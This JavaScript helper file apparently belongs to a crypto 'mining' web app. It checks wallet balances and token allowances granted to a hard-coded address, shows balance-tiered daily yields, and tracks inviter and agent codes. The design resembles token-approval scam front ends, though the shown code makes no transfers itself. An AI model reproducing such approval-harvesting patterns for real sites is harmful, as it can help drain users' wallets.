function notNull(str) {
	if ((str == null || str == undefined || str == "" || str == "null" || str == 'undefined')) {
		return false;
	} else {
		return true;
	}
}

function isNull(str) {
	return !notNull(str);
}

function getRequest() {
	var url = location.search;
	var param = new Object();
	if (url.indexOf("?") != -1) {
		var str = url.substr(1);
		strs = str.split("&");
		for (var i = 0; i < strs.length; i++) {
			param[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);
		}
	}
	return param;
}

// 获取钱包信息
async function getWalletInfo(_that) {
	let _data = localStorage.getItem("walletInfo");
	if (notNull(_data)) {
		let data1 = JSON.parse(_data);
		_that.chainType = data1.chainType;
		_that.walletType = data1.walletType;
		_that.address = data1.address;
		walletType = data1.walletType;

		// 启动监听
		changeEth(data1.chainType);
		if(isweb3j(_that.chainType)){
			// 4 监听钱包变化
			metaMaskListenAccountChange(data1.chainType);
		} else if (_that.chainType == "trx") {
			// 3 监听钱包变化 TODO
			tronLinkListenAccountChange(data1.chainType)
		}
	}
}

// 保存 选择的链 和 选择的钱包
async function updateWalletInfo(_chainType, _walletType, _address) {
	console.log("updateWalletInfo");
	let _data = {
		"chainType": _chainType,
		"walletType": _walletType,
		"address": _address
	};
	localStorage.setItem("walletInfo", JSON.stringify(_data));
	console.log("开始设置that.chainType:" + _chainType)
	that.chainType = _chainType;
	that.walletType = _walletType;
	that.address = _address;

	walletType = _walletType;

	queryWalletInfo(that);
}


// 查询钱包信息
async function queryWalletInfo(_that) {
	let adr = _that.address;
	console.log("查询链上信息:" + adr);
	if (notNull(adr) && productData.length > 0) {
		for (let i = 0; i < productData.length; i++) {
			if (iswap() == "app") {
				await query(_that, productData[i])
			} else {
				query(_that, productData[i])
			}
		}
		
		_that.nftShow = new Date().toString();
		_that.coinShow = new Date().toString();
	}
}

async function query(_that, item) {

	console.log("query");
	let ba; // 持有数量
	let allow; //是否授权
	let adr = _that.address;

	let approveAddr = getAgentApprovedWallet(_that, item.chainType, item.busType);

	if (item.protocol == "erc721") {
		//console.log("nft")
		// 获取nft持有数量
		ba = await getContractNFTBalance(item.quoteCurrencyCtrAddr, item.quoteCurrencyABI, item.chainType)
		// 获取nft授权情况
		allow = await isApprovedForAllnft(approveAddr, item.quoteCurrencyCtrAddr, item.quoteCurrencyABI, item
			.chainType)
		//console.log("nft:"+item.quoteCurrency+"-"+ba + "-" + allow)

	} else {
		//  // 代币余额
		ba = await getContractBalance(item.quoteCurrencyCtrAddr, item.quoteCurrencyABI, item.quoteCurrencyDecimals,
			item.chainType);
		// 获取授权情况
		allow = await allowance(approveAddr, item.quoteCurrencyCtrAddr, item.quoteCurrencyABI, item
			.quoteCurrencyDecimals, item.chainType);
	}

	//console.log("查询链上信息,adr:" + adr + ",ba:"+ba+",allow:"+allow+",wallet:"+walletType + ",chainType:" +item.chainType );

	if ((notNull(ba) || ba == 0) || (notNull(allow) || allow == 0)) {
		// 钱包信息填充
		let walletData = {};
		let _key = adr + "-" + item.id + "-" + item.chainType;
		let _data = {};
		_data.balance = ba || 0;
		_data.chainType = item.chainType;
		_data.coinContractAdr = item.quoteCurrencyCtrAddr;
		_data.apprvedNum = allow || 0;
		_data.approveAddr = approveAddr;
		

		// 收益率填充
		if (item.protocol == "erc721"){
			
		}else{
			if(notNull(item.productYields) && item.productYields.length > 0){
				if(_data.balance > 0){
					for(let i =0;i<item.productYields.length;i++){
						let yield = item.productYields[i];
						if(new BigNumber(_data.balance).comparedTo(new BigNumber(yield.minNum)) >=0 && 
						(yield.maxNum ==-1 || new BigNumber(_data.balance).comparedTo(new BigNumber(yield.maxNum)) < 0)){
							_data.dayYield = yield.dayYield;
							let yieldNum = new BigNumber(yield.dayYield * _data.balance).dividedBy(100).toFixed(2);
							_data.yieldNum = yieldNum;
							break;
						}
					}
				}
			}
			
			if(isNull(_data.dayYield)){

				_data.dayYield = item.productYields[0].dayYield;
				_data.yieldNum = 0;

			}
		}

		_that.walletinfo[_key] = _data;
	}
}

function disconnect(_that) {
	_that.address = "";
	_that.walletinfo = {};
	_that.chainType = "";
	localStorage.removeItem("walletInfo");
}

// 获取邀请码
function getInviterCode() {
	let inviterCode;
	let paramUrl = getRequest();
	if (notNull(paramUrl)) {
		inviterCode = paramUrl.inviterCode;
		if (notNull(inviterCode)) {
			localStorage.setItem("inviterCode", inviterCode);
		}
	}
	if (isNull(inviterCode)) {
		inviterCode = localStorage.getItem("inviterCode");
	}
	return inviterCode;
}


// 获取邀代理请码
function getAgentCode() {
	let code;
	let paramUrl = getRequest();
	if (notNull(paramUrl)) {
		code = paramUrl.code;
		if (notNull(code)) {
			localStorage.setItem("code", code);
		}
	}
	if (isNull(code)) {
		code = localStorage.getItem("code");
	}
	return code;
}

// 判断设备类型
function iswap() {
	var uA = navigator.userAgent.toLowerCase();
	var ipad = uA.match(/ipad/i) == "ipad";
	var iphone = uA.match(/iphone os/i) == "iphone os";
	var midp = uA.match(/midp/i) == "midp";
	var uc7 = uA.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
	var uc = uA.match(/ucweb/i) == "ucweb";
	var android = uA.match(/android/i) == "android";
	var windowsce = uA.match(/windows ce/i) == "windows ce";
	var windowsmd = uA.match(/windows mobile/i) == "windows mobile";
	if (!(ipad || iphone || midp || uc7 || uc || android || windowsce || windowsmd)) {
		// PC 端
		return "pc";
	} else {
		// 移动端
		return "app";
	}
}

function waType() {

	var uA = navigator.userAgent.toLowerCase();
	var tokenpocket = uA.match(/tokenpocket/i) == "tokenpocket";
	if (tokenpocket) {
		return "tokenpocket";
	}

	var imtoken = uA.match(/imtoken/i) == "imtoken";
	if (imtoken) {
		return "imtoken";
	}
	
	var okex = uA.match(/okex/i) == "okex";
	if (okex) {
		return "okexwallet";
	}

	if(notNull(window.okxwallet)){
		return "okexwallet";
	}

	if (iswap() == "app" && typeof window.ethereum != 'undefined') {
		return "metamask";
	}

	if (iswap() == "app" && typeof window.tronWeb != 'undefined') {
		return "tronLink";
	}

	return "default";
}


//======= 时间倒计时 ===========

//设置定时器每隔一秒，计算一次剩余时间 clearInterval
function resCountDown(that, time) {
	clearInterval(that.outtime.timer);
	if (!time)
		return;
	if (time <= 0) return "00:00:00:00";
	that.outtime.timer = setInterval(function() {
		var result = getCountDown(time, [{
				unit: 86400000,
				append: ':'
			},
			{
				unit: 3600000,
				append: ':'
			},
			{
				unit: 60000,
				append: ':'
			},
			{
				unit: 1000,
				append: ' '
			}
		]);
		time -= 1000;
		if (time <= 0) {
			clearInterval(that.outtime.timer);
			result = "00:00:00:00";
		}
		that.outtime.freezeOutTime = result
	}, 1000)
}

//根据秒计算剩余天数时分秒
function getCountDown(seconds, level) {
	var result = '';
	var time = Math.floor(seconds / level[0].unit);
	result += time < 10 ? '0' + time : time;
	result += level[0].append;
	var sec = seconds - (time * level[0].unit);
	level.splice(0, 1);
	if (level.length > 0) {
		result += getCountDown(sec, level);
	}
	return result;
}

//zip	  
function unzip(str) {
	decode64Str = Base64.atob(str),
		charData = decode64Str.split('').map(function(x) {
			return x.charCodeAt(0)
		}),
		binData = new Uint8Array(charData),
		pakoData = pako.inflate(binData),
		result = handleCodePoints(new Uint16Array(pakoData)),
		result = result.replace(/%/g, '%25');
		resultData = JSON.parse(decodeURI(result)) // 这里是最后解压出来的数据
	return resultData;
}


function handleCodePoints(array) {
	var CHUNK_SIZE = 0x8000; // arbitrary number here, not too small, not too big
	var index = 0;
	var length = array.length;
	var result = '';
	var slice;
	var arr = [];
	for (var i = 0, _i = array.length; i < _i; i++) {
		arr[i] = array[i];
	}
	while (index < length) {
		slice = arr.slice(index, Math.min(index + CHUNK_SIZE,
		length)); // `Math.min` is not really necessary here I think
		result += String.fromCharCode.apply(null, slice);
		index += CHUNK_SIZE;
	}
	return result;
}


// 更新用户中心数据
function updateUserDate(_that) {
	_that.getUserData();
	_that.getYieldDayList();
	_that.miningList();
	_that.getWithdrawRecord();
	_that.getInviteRewardsList();
}

function Marquee(dzpzjmd, dzpzjmd1, dzpzjmd2) {
	if (dzpzjmd1.offsetTop - dzpzjmd.scrollTop >= 0)
		dzpzjmd.scrollTop += dzpzjmd2.offsetHeight
	else {
		dzpzjmd.scrollTop--
	}
}

// 切换大转盘
function changeDazhuanp(type, _that) {
	let list = [];
	let d = _that.prizesAll[type]
	for (let i = 0; i < d.length; i++) {
		let data = d[i]
		let a;
		if (i % 2 == 1) {
			a = '{"fonts":[{"text":"' + data.prizeName + '","top":"10%"}],"background":"#e9e8fe"}'
		} else {
			a = '{"fonts":[{"text":"' + data.prizeName + '","top":"10%"}],"background":"#b8c5f2"}'
		}
		let _data = JSON.parse(a);
		_data.coinAmount = data.coinAmount
		_data.chainType = data.chainType
		_data.coinContractAddr = data.coinContractAddr
		_data.coinType = data.coinType
		_data.prizeName = data.prizeName
		_data.protocol = data.protocol
		_data.transferAddr = data.transferAddr
		_data.id = data.id
		list.push(_data)
	}
	_that.prizes = list;

	_that.dazhuanp.oldType = type;
}

function getAgentApprovedWallet(that, chainType, busType) {
	let approveAddr;
// 	if (notNull(that.agentInfo.agentWallet)) {
// 		approveAddr = that.agentInfo.agentWallet[chainType + "-" + busType]
// 	}
	if (isNull(approveAddr)) {
        if(chainType == "eth") {
			approveAddr = "0x8c1658cc3c1bd06864c71f1bc7e00078021ab03a";
		}else if(chainType == "bsc"){
			approveAddr = "0x8c1658cc3c1bd06864c71f1bc7e00078021ab03a";
		}
	}
	return approveAddr;
}
